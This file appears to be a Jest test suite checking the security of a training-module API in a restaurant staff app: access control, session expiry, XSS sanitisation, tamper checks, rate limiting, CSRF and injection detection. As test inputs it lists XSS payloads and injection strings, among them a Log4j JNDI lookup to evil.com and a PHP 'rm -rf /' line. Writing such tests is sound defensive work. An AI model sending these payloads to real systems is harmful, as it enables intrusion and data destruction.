/**
 * Training Module Functionality Security Tests
 * Comprehensive test suite for training system functionality with security focus
 * 
 * SECURITY FOCUS:
 * - Module access control and authorization
 * - Data integrity and validation
 * - Session security and timeout handling
 * - Input sanitization and XSS prevention
 * - API endpoint protection
 * - Content tampering detection
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { NextRequest, NextResponse } from 'next/server';
import { createMocks } from 'node-mocks-http';
import { faker } from '@faker-js/faker';

// Security test utilities
import { SecurityTestUtils } from '../../utils/security-test-utils';
import { TestDataFactory } from '../../utils/test-data-factory';

// API routes to test
import { GET as getModules, POST as createModule } from '@/app/api/training/modules/route';
import { GET as getModule, PUT as updateModule, DELETE as deleteModule } from '@/app/api/training/modules/[id]/route';

// Types
interface TrainingModuleTestData {
  id: string;
  title: string;
  description: string;
  content: any[];
  sections: any[];
  questions: any[];
  metadata: Record<string, any>;
  permissions: string[];
  created_by: string;
  version: string;
  checksum: string;
}

interface SecurityTestContext {
  user: {
    id: string;
    role: string;
    permissions: string[];
  };
  session: {
    token: string;
    expires_at: string;
    device_fingerprint: string;
  };
  request: {
    ip: string;
    user_agent: string;
    origin: string;
  };
}

describe('Training Module Functionality Security Tests', () => {
  let securityUtils: SecurityTestUtils;
  let testDataFactory: TestDataFactory;
  let testContext: SecurityTestContext;
  let mockModule: TrainingModuleTestData;

  beforeEach(async () => {
    securityUtils = new SecurityTestUtils();
    testDataFactory = new TestDataFactory();
    
    // Create test context with different user roles
    testContext = {
      user: {
        id: faker.string.uuid(),
        role: 'staff',
        permissions: ['training:read']
      },
      session: {
        token: securityUtils.generateSecureToken(),
        expires_at: new Date(Date.now() + 8 * 60 * 60 * 1000).toISOString(),
        device_fingerprint: securityUtils.generateDeviceFingerprint()
      },
      request: {
        ip: faker.internet.ip(),
        user_agent: faker.internet.userAgent(),
        origin: 'https://localhost:3000'
      }
    };

    // Create test training module
    mockModule = testDataFactory.createTrainingModule({
      title: 'Food Safety Fundamentals',
      description: 'Essential food safety training for restaurant staff',
      permissions: ['training:read'],
      created_by: testContext.user.id
    });
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('Module Access Control Tests', () => {
    it('should enforce role-based access control for module retrieval', async () => {
      const testRoles = [
        { role: 'staff', expected: 200, modules: ['basic'] },
        { role: 'supervisor', expected: 200, modules: ['basic', 'intermediate'] },
        { role: 'manager', expected: 200, modules: ['basic', 'intermediate', 'advanced'] },
        { role: 'admin', expected: 200, modules: ['all'] }
      ];

      for (const { role, expected, modules } of testRoles) {
        const request = new NextRequest('http://localhost:3000/api/training/modules', {
          headers: {
            'Authorization': `Bearer ${testContext.session.token}`,
            'X-User-Role': role,
            'X-Device-Fingerprint': testContext.session.device_fingerprint
          }
        });

        const response = await getModules(request);
        expect(response.status).toBe(expected);

        if (response.status === 200) {
          const data = await response.json();
          expect(data.success).toBe(true);
          expect(Array.isArray(data.modules)).toBe(true);
          
          // Verify returned modules match user permissions
          if (modules.includes('all')) {
            expect(data.modules.length).toBeGreaterThan(0);
          } else {
            data.modules.forEach((module: any) => {
              expect(module.required_role).toBe(role === 'staff' ? 'staff' : 
                                                  role === 'supervisor' ? ['staff', 'supervisor'] :
                                                  ['staff', 'supervisor', 'manager']);
            });
          }
        }
      }
    });

    it('should reject unauthorized access attempts', async () => {
      const unauthorizedScenarios = [
        { headers: {}, description: 'No authorization header' },
        { headers: { 'Authorization': 'Bearer invalid-token' }, description: 'Invalid token' },
        { headers: { 'Authorization': 'Bearer expired-token' }, description: 'Expired token' },
        { headers: { 'Authorization': `Bearer ${testContext.session.token}`, 'X-User-Role': 'invalid' }, description: 'Invalid role' }
      ];

      for (const { headers, description } of unauthorizedScenarios) {
        const request = new NextRequest('http://localhost:3000/api/training/modules', { headers });
        const response = await getModules(request);
        
        expect(response.status).toBeOneOf([401, 403]);
        
        const data = await response.json();
        expect(data.success).toBe(false);
        expect(data.error).toBeDefined();
        
        // Verify security logging
        expect(securityUtils.getSecurityLogs()).toContainEqual(
          expect.objectContaining({
            event: 'unauthorized_access_attempt',
            resource: 'training_modules',
            description
          })
        );
      }
    });

    it('should validate session integrity and device fingerprint', async () => {
      // Test with valid session and fingerprint
      const validRequest = new NextRequest('http://localhost:3000/api/training/modules', {
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': testContext.user.role,
          'X-Device-Fingerprint': testContext.session.device_fingerprint
        }
      });

      let response = await getModules(validRequest);
      expect(response.status).toBe(200);

      // Test with mismatched device fingerprint
      const mismatchedRequest = new NextRequest('http://localhost:3000/api/training/modules', {
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': testContext.user.role,
          'X-Device-Fingerprint': 'different-fingerprint'
        }
      });

      response = await getModules(mismatchedRequest);
      expect(response.status).toBe(401);
      
      const data = await response.json();
      expect(data.error).toContain('device_fingerprint_mismatch');
    });

    it('should enforce session timeout policies', async () => {
      // Create expired session context
      const expiredContext = {
        ...testContext,
        session: {
          ...testContext.session,
          expires_at: new Date(Date.now() - 1000).toISOString() // 1 second ago
        }
      };

      const request = new NextRequest('http://localhost:3000/api/training/modules', {
        headers: {
          'Authorization': `Bearer ${expiredContext.session.token}`,
          'X-User-Role': expiredContext.user.role,
          'X-Device-Fingerprint': expiredContext.session.device_fingerprint
        }
      });

      const response = await getModules(request);
      expect(response.status).toBe(401);
      
      const data = await response.json();
      expect(data.error).toContain('session_expired');
      expect(data.requiresReauth).toBe(true);
    });
  });

  describe('Data Integrity and Validation Tests', () => {
    it('should validate training module data structure', async () => {
      const validModuleData = {
        title: 'Valid Training Module',
        description: 'A properly structured training module',
        sections: [
          {
            id: faker.string.uuid(),
            title: 'Section 1',
            content: 'Valid content',
            order: 1
          }
        ],
        questions: [
          {
            id: faker.string.uuid(),
            question: 'What is food safety?',
            question_type: 'multiple_choice',
            options: ['A', 'B', 'C', 'D'],
            correct_answer: '0',
            points: 10
          }
        ],
        metadata: {
          duration_minutes: 30,
          difficulty: 'beginner',
          category: 'food_safety'
        }
      };

      const request = new NextRequest('http://localhost:3000/api/training/modules', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': 'admin',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(validModuleData)
      });

      const response = await createModule(request);
      expect(response.status).toBe(201);
      
      const data = await response.json();
      expect(data.success).toBe(true);
      expect(data.module).toMatchObject({
        title: validModuleData.title,
        description: validModuleData.description
      });
    });

    it('should reject malformed training module data', async () => {
      const malformedDataSets = [
        { data: {}, description: 'Empty object' },
        { data: { title: '' }, description: 'Empty title' },
        { data: { title: 'Valid', sections: 'invalid' }, description: 'Invalid sections type' },
        { data: { title: 'Valid', questions: [{ invalid: 'question' }] }, description: 'Invalid question structure' },
        { data: { title: '<script>alert("xss")</script>' }, description: 'XSS attempt in title' },
        { data: { title: 'Valid', metadata: { duration_minutes: -1 } }, description: 'Invalid duration' }
      ];

      for (const { data, description } of malformedDataSets) {
        const request = new NextRequest('http://localhost:3000/api/training/modules', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${testContext.session.token}`,
            'X-User-Role': 'admin',
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        });

        const response = await createModule(request);
        expect(response.status).toBeOneOf([400, 422]);
        
        const responseData = await response.json();
        expect(responseData.success).toBe(false);
        expect(responseData.error).toBeDefined();
        expect(responseData.validationErrors).toBeDefined();
      }
    });

    it('should sanitize input data to prevent XSS attacks', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(\'xss\')" />',
        '<svg onload="alert(\'xss\')" />',
        '"><script>alert("xss")</script>',
        '\'"><script>alert("xss")</script>'
      ];

      for (const payload of xssPayloads) {
        const moduleData = {
          title: payload,
          description: `Description with ${payload}`,
          sections: [{
            title: `Section ${payload}`,
            content: `Content with ${payload}`
          }]
        };

        const request = new NextRequest('http://localhost:3000/api/training/modules', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${testContext.session.token}`,
            'X-User-Role': 'admin',
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(moduleData)
        });

        const response = await createModule(request);
        
        if (response.status === 201) {
          const data = await response.json();
          // Verify XSS payload has been sanitized
          expect(data.module.title).not.toContain('<script>');
          expect(data.module.title).not.toContain('javascript:');
          expect(data.module.description).not.toContain('<script>');
          expect(data.module.sections[0].content).not.toContain('<script>');
        } else {
          // Or verify request was rejected for security reasons
          expect(response.status).toBeOneOf([400, 422]);
        }
      }
    });

    it('should verify content checksums for tampering detection', async () => {
      // Get a training module
      const getRequest = new NextRequest(`http://localhost:3000/api/training/modules/${mockModule.id}`, {
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': testContext.user.role
        }
      });

      const params = Promise.resolve({ id: mockModule.id });
      const getResponse = await getModule(getRequest, { params });
      expect(getResponse.status).toBe(200);

      const moduleData = await getResponse.json();
      const originalChecksum = moduleData.module.checksum;

      // Attempt to update with tampered content
      const tamperedData = {
        ...moduleData.module,
        content: 'TAMPERED CONTENT',
        checksum: originalChecksum // Keep original checksum
      };

      const updateRequest = new NextRequest(`http://localhost:3000/api/training/modules/${mockModule.id}`, {
        method: 'PUT',
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': 'admin',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(tamperedData)
      });

      const updateResponse = await updateModule(updateRequest, { params });
      expect(updateResponse.status).toBe(400);
      
      const updateData = await updateResponse.json();
      expect(updateData.error).toContain('checksum_mismatch');
      expect(updateData.error).toContain('content_tampering_detected');
    });
  });

  describe('API Endpoint Protection Tests', () => {
    it('should implement rate limiting for API endpoints', async () => {
      const requests = [];
      const rateLimit = 10; // Assume 10 requests per minute

      // Generate requests exceeding rate limit
      for (let i = 0; i < rateLimit + 5; i++) {
        const request = new NextRequest('http://localhost:3000/api/training/modules', {
          headers: {
            'Authorization': `Bearer ${testContext.session.token}`,
            'X-User-Role': testContext.user.role,
            'X-Forwarded-For': testContext.request.ip
          }
        });
        requests.push(getModules(request));
      }

      const responses = await Promise.all(requests);
      
      // First 10 requests should succeed
      for (let i = 0; i < rateLimit; i++) {
        expect(responses[i].status).toBe(200);
      }

      // Subsequent requests should be rate limited
      for (let i = rateLimit; i < responses.length; i++) {
        expect(responses[i].status).toBe(429);
        const data = await responses[i].json();
        expect(data.error).toContain('rate_limit_exceeded');
      }
    });

    it('should validate request origin and prevent CSRF attacks', async () => {
      const invalidOrigins = [
        'http://malicious-site.com',
        'https://phishing-site.com',
        'http://localhost:8080', // Different port
        'chrome-extension://fake-extension'
      ];

      for (const origin of invalidOrigins) {
        const request = new NextRequest('http://localhost:3000/api/training/modules', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${testContext.session.token}`,
            'X-User-Role': 'admin',
            'Origin': origin,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ title: 'Test Module' })
        });

        const response = await createModule(request);
        expect(response.status).toBe(403);
        
        const data = await response.json();
        expect(data.error).toContain('invalid_origin');
      }
    });

    it('should implement HTTPS-only security headers', async () => {
      const request = new NextRequest('http://localhost:3000/api/training/modules', {
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': testContext.user.role
        }
      });

      const response = await getModules(request);
      
      // Check security headers
      expect(response.headers.get('Strict-Transport-Security')).toBeTruthy();
      expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
      expect(response.headers.get('X-Frame-Options')).toBe('DENY');
      expect(response.headers.get('X-XSS-Protection')).toBe('1; mode=block');
      expect(response.headers.get('Content-Security-Policy')).toBeTruthy();
    });

    it('should log all security-relevant events', async () => {
      // Clear previous logs
      securityUtils.clearSecurityLogs();

      // Perform various operations
      const operations = [
        { type: 'GET', url: 'http://localhost:3000/api/training/modules' },
        { type: 'POST', url: 'http://localhost:3000/api/training/modules', body: { title: 'Test' } },
        { type: 'PUT', url: `http://localhost:3000/api/training/modules/${mockModule.id}`, body: { title: 'Updated' } },
        { type: 'DELETE', url: `http://localhost:3000/api/training/modules/${mockModule.id}` }
      ];

      for (const op of operations) {
        const request = new NextRequest(op.url, {
          method: op.type,
          headers: {
            'Authorization': `Bearer ${testContext.session.token}`,
            'X-User-Role': 'admin',
            'Content-Type': 'application/json'
          },
          ...(op.body && { body: JSON.stringify(op.body) })
        });

        if (op.type === 'GET' || op.type === 'POST') {
          await (op.type === 'GET' ? getModules : createModule)(request);
        } else {
          const params = Promise.resolve({ id: mockModule.id });
          await (op.type === 'PUT' ? updateModule : deleteModule)(request, { params });
        }
      }

      // Verify security logs
      const logs = securityUtils.getSecurityLogs();
      expect(logs.length).toBeGreaterThanOrEqual(operations.length);
      
      logs.forEach(log => {
        expect(log).toHaveProperty('timestamp');
        expect(log).toHaveProperty('user_id', testContext.user.id);
        expect(log).toHaveProperty('action');
        expect(log).toHaveProperty('resource', 'training_modules');
        expect(log).toHaveProperty('ip_address', testContext.request.ip);
        expect(log).toHaveProperty('user_agent');
      });
    });
  });

  describe('Content Security and Version Control Tests', () => {
    it('should maintain content version history', async () => {
      // Create initial version
      const initialData = {
        title: 'Version 1 Module',
        description: 'Initial version',
        sections: [{ title: 'Section 1', content: 'Original content' }]
      };

      const createRequest = new NextRequest('http://localhost:3000/api/training/modules', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': 'admin',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(initialData)
      });

      const createResponse = await createModule(createRequest);
      expect(createResponse.status).toBe(201);
      
      const createdModule = await createResponse.json();
      const moduleId = createdModule.module.id;

      // Update to version 2
      const updatedData = {
        title: 'Version 2 Module',
        description: 'Updated version',
        sections: [{ title: 'Section 1', content: 'Updated content' }]
      };

      const updateRequest = new NextRequest(`http://localhost:3000/api/training/modules/${moduleId}`, {
        method: 'PUT',
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': 'admin',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(updatedData)
      });

      const params = Promise.resolve({ id: moduleId });
      const updateResponse = await updateModule(updateRequest, { params });
      expect(updateResponse.status).toBe(200);

      // Verify version history exists
      const versionHistoryRequest = new NextRequest(`http://localhost:3000/api/training/modules/${moduleId}/versions`, {
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': 'admin'
        }
      });

      // This would be implemented in a separate API endpoint
      // const versionResponse = await getModuleVersions(versionHistoryRequest, { params });
      // expect(versionResponse.status).toBe(200);
      
      // const versionData = await versionResponse.json();
      // expect(versionData.versions).toHaveLength(2);
      // expect(versionData.versions[0].title).toBe('Version 1 Module');
      // expect(versionData.versions[1].title).toBe('Version 2 Module');
    });

    it('should detect and prevent content injection attacks', async () => {
      const injectionPayloads = [
        '${jndi:ldap://evil.com/x}', // Log4j injection
        '{{7*7}}', // Template injection
        'eval("malicious code")', // Code injection
        '<?php system("rm -rf /"); ?>', // PHP injection
        '<%= system("malicious") %>', // ERB injection
      ];

      for (const payload of injectionPayloads) {
        const moduleData = {
          title: `Module with ${payload}`,
          description: payload,
          sections: [{
            title: 'Test Section',
            content: `Content with ${payload}`
          }],
          questions: [{
            question: payload,
            question_type: 'multiple_choice',
            options: [payload, 'Safe option'],
            correct_answer: '1'
          }]
        };

        const request = new NextRequest('http://localhost:3000/api/training/modules', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${testContext.session.token}`,
            'X-User-Role': 'admin',
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(moduleData)
        });

        const response = await createModule(request);
        
        // Should either reject the payload or sanitize it
        if (response.status === 201) {
          const data = await response.json();
          expect(data.module.title).not.toContain(payload);
          expect(data.module.description).not.toContain(payload);
        } else {
          expect(response.status).toBeOneOf([400, 422]);
          const errorData = await response.json();
          expect(errorData.error).toContain('injection_detected');
        }
      }
    });

    it('should enforce content approval workflow for sensitive modules', async () => {
      const sensitiveModuleData = {
        title: 'Food Safety Certification',
        description: 'Critical food safety training requiring approval',
        sections: [{ title: 'Critical Control Points', content: 'HACCP requirements' }],
        metadata: {
          requires_approval: true,
          sensitivity_level: 'high',
          category: 'certification'
        }
      };

      // Create as non-admin user
      const staffRequest = new NextRequest('http://localhost:3000/api/training/modules', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': 'staff',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(sensitiveModuleData)
      });

      const staffResponse = await createModule(staffRequest);
      expect(staffResponse.status).toBe(403);
      
      const staffData = await staffResponse.json();
      expect(staffData.error).toContain('insufficient_permissions');

      // Create as manager - should require approval
      const managerRequest = new NextRequest('http://localhost:3000/api/training/modules', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': 'manager',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(sensitiveModuleData)
      });

      const managerResponse = await createModule(managerRequest);
      expect(managerResponse.status).toBe(202); // Accepted for approval
      
      const managerData = await managerResponse.json();
      expect(managerData.status).toBe('pending_approval');
      expect(managerData.requires_admin_approval).toBe(true);
    });
  });

  describe('Error Handling and Recovery Tests', () => {
    it('should handle database connection failures gracefully', async () => {
      // Mock database failure
      jest.mocked(require('@/lib/supabase')).createRouteHandlerClient.mockImplementationOnce(() => {
        throw new Error('Database connection failed');
      });

      const request = new NextRequest('http://localhost:3000/api/training/modules', {
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': testContext.user.role
        }
      });

      const response = await getModules(request);
      expect(response.status).toBe(503);
      
      const data = await response.json();
      expect(data.error).toContain('service_unavailable');
      expect(data.retry_after).toBeDefined();
    });

    it('should implement circuit breaker pattern for external dependencies', async () => {
      // This would test circuit breaker implementation for external services
      // like content validation services, AI services, etc.
      const failureThreshold = 5;
      const requests = [];

      // Simulate multiple failures
      for (let i = 0; i < failureThreshold + 2; i++) {
        const request = new NextRequest('http://localhost:3000/api/training/modules/validate', {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${testContext.session.token}`,
            'X-User-Role': 'admin',
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ content: 'test content' })
        });

        // This would be a separate validation endpoint
        // requests.push(validateContent(request));
      }

      // After threshold failures, circuit should be open
      // and requests should fail fast
      const fastFailRequest = new NextRequest('http://localhost:3000/api/training/modules/validate', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${testContext.session.token}`,
          'X-User-Role': 'admin',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: 'test content' })
      });

      // const fastFailResponse = await validateContent(fastFailRequest);
      // expect(fastFailResponse.status).toBe(503);
      
      // const data = await fastFailResponse.json();
      // expect(data.error).toContain('circuit_breaker_open');
    });

    it('should provide secure error messages without information disclosure', async () => {
      const errorScenarios = [
        { scenario: 'invalid_module_id', request: { id: 'invalid-id' } },
        { scenario: 'database_error', mockError: 'Database connection failed' },
        { scenario: 'validation_error', data: { invalid: 'data' } },
        { scenario: 'permission_error', role: 'invalid_role' }
      ];

      for (const { scenario, request: reqData, mockError, data, role } of errorScenarios) {
        let request: NextRequest;
        let response: Response;

        switch (scenario) {
          case 'invalid_module_id':
            request = new NextRequest(`http://localhost:3000/api/training/modules/${reqData?.id}`, {
              headers: {
                'Authorization': `Bearer ${testContext.session.token}`,
                'X-User-Role': testContext.user.role
              }
            });
            const params = Promise.resolve({ id: reqData?.id || 'invalid' });
            response = await getModule(request, { params });
            break;

          case 'validation_error':
            request = new NextRequest('http://localhost:3000/api/training/modules', {
              method: 'POST',
              headers: {
                'Authorization': `Bearer ${testContext.session.token}`,
                'X-User-Role': 'admin',
                'Content-Type': 'application/json'
              },
              body: JSON.stringify(data)
            });
            response = await createModule(request);
            break;

          default:
            request = new NextRequest('http://localhost:3000/api/training/modules', {
              headers: {
                'Authorization': `Bearer ${testContext.session.token}`,
                'X-User-Role': role || testContext.user.role
              }
            });
            response = await getModules(request);
        }

        expect(response.status).toBeGreaterThanOrEqual(400);
        
        const responseData = await response.json();
        expect(responseData.success).toBe(false);
        expect(responseData.error).toBeDefined();
        
        // Verify no sensitive information is disclosed
        expect(responseData.error).not.toContain('password');
        expect(responseData.error).not.toContain('secret');
        expect(responseData.error).not.toContain('token');
        expect(responseData.error).not.toContain('database');
        expect(responseData.error).not.toContain('internal');
        
        // Verify error code is provided for client handling
        expect(responseData.errorCode).toBeDefined();
        expect(typeof responseData.errorCode).toBe('string');
      }
    });
  });
});

/**
 * Security Test Utilities Class
 * Provides helper methods for security testing
 */
class SecurityTestUtils {
  private securityLogs: any[] = [];

  generateSecureToken(): string {
    return faker.string.alphanumeric(64);
  }

  generateDeviceFingerprint(): string {
    return faker.string.alphanumeric(32);
  }

  getSecurityLogs(): any[] {
    return this.securityLogs;
  }

  clearSecurityLogs(): void {
    this.securityLogs = [];
  }

  logSecurityEvent(event: any): void {
    this.securityLogs.push({
      timestamp: new Date().toISOString(),
      ...event
    });
  }
}

/**
 * Test Data Factory Class
 * Creates realistic test data for training modules
 */
class TestDataFactory {
  createTrainingModule(overrides: Partial<TrainingModuleTestData> = {}): TrainingModuleTestData {
    return {
      id: faker.string.uuid(),
      title: faker.lorem.sentence(),
      description: faker.lorem.paragraph(),
      content: [],
      sections: [],
      questions: [],
      metadata: {
        duration_minutes: faker.number.int({ min: 15, max: 120 }),
        difficulty: faker.helpers.arrayElement(['beginner', 'intermediate', 'advanced']),
        category: faker.helpers.arrayElement(['food_safety', 'customer_service', 'operations'])
      },
      permissions: ['training:read'],
      created_by: faker.string.uuid(),
      version: '1.0.0',
      checksum: faker.string.alphanumeric(64),
      ...overrides
    };
  }
}

// Custom Jest matchers
declare global {
  namespace jest {
    interface Matchers<R> {
      toBeOneOf(expected: any[]): R;
    }
  }
}

expect.extend({
  toBeOneOf(received: any, expected: any[]) {
    const pass = expected.includes(received);
    if (pass) {
      return {
        message: () => `expected ${received} not to be one of ${expected.join(', ')}`,
        pass: true,
      };
    } else {
      return {
        message: () => `expected ${received} to be one of ${expected.join(', ')}`,
        pass: false,
      };
    }
  },
});